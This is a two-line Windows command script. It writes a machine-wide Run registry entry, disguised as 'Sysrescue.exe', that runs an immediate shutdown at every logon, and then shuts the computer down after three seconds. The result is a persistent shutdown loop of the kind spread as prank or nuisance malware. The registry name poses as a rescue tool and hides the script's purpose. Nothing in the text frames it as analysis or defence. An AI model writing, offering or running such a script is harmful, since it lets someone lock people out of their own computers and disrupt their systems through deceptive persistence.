REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v Sysrescue.exe /t REG_SZ  /d "shutdown -s -t 00"

shutdown -s -t 03
